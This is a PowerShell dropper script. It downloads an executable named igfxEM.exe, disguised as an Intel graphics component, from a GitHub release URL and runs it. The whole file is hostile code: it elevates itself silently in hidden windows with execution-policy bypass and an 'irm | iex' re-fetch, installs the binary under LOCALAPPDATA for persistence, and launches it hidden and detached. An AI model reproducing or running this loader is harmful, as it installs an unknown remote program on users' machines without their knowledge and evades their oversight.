$ExeUrl  = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
$AppName = "igfxEM.exe"
$ErrorActionPreference = "Stop"

# TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Admin?
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # Silent elevate — same pipeline URL if irm|iex, else this file
    if ($MyInvocation.Line -match '(https?://\S+)') {
        $url = $Matches[1]
        $cmd = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm '$url' | iex"
        Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd"
    } else {
        $scriptPath = $MyInvocation.MyCommand.Path
        if (-not $scriptPath) { $scriptPath = $PSCommandPath }
        Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    }
    exit 0
}

# Install dir (not random TEMP — survives better)
$InstallDir = Join-Path $env:LOCALAPPDATA "igfxEM"
New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
$ExePath = Join-Path $InstallDir $AppName

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing

# Kill old instance if any
Get-Process -Name "igfxEM" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 300

# DETACHED — no console, no redirect, not tied to this PowerShell
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $ExePath
$psi.WorkingDirectory = $InstallDir
$psi.UseShellExecute = $true
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
[void][System.Diagnostics.Process]::Start($psi)

# Exit immediately — closing this window will NOT kill igfxEM
exit 0
